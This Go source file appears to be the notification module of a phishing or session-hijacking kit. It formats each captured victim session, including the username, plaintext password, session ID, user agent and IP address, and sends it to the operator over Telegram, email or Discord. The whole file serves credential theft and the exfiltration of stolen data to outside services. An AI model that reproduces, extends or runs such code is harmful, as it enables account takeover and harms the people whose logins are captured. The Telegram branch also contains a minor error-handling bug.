package main

import (
	"fmt"
)

func formatSessionMessage(session Session) string {
	return fmt.Sprintf("✨ **Session Information** ✨\n\n"+
		"👤 Username:      ➖ %s\n"+
		"🔑 Password:      ➖ %s\n"+
		"🌐 Landing URL:   ➖ %s\n"+
		"🆔 Session ID:    ➖ %s\n"+
		"🖥️ User Agent:    ➖ %s\n"+
		"🌍 Remote Address:➖ %s\n"+
		"🕒 Create Time:   ➖ %d\n"+
		"🕔 Update Time:   ➖ %d\n",
		session.Username,
		session.Password,
		session.LandingURL,
		session.SessionID,
		session.UserAgent,
		session.RemoteAddr,
		session.CreateTime,
		session.UpdateTime,
	)
}

func Notify(session Session) {
	config, err := loadConfig()
	if err != nil {
		fmt.Println(err)
	}
	message := formatSessionMessage(session)
	fmt.Printf("------------------------------------------------------\n")
	fmt.Printf("Latest Session:\n")
	fmt.Printf(message)
	fmt.Printf("------------------------------------------------------\n")

	if config.TelegramEnable {

		sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message)
		if err != nil {
			fmt.Printf("Error sending Telegram notification: %v\n", err)
		}
	}

	if config.MailEnable {
		err := sendMailNotification(config.MailHost, config.MailPort, config.MailUser, config.MailPassword, config.ToMail, message)
		if err != nil {
			fmt.Printf("Error sending Mail notification: %v\n", err)
		}
	}

	if config.DiscordEnable {
		err := sendDiscordNotification(config.DiscordChatID, config.DiscordToken, message)
		if err != nil {
			fmt.Printf("Error sending Discord notification: %v\n", err)
		}
	}
}
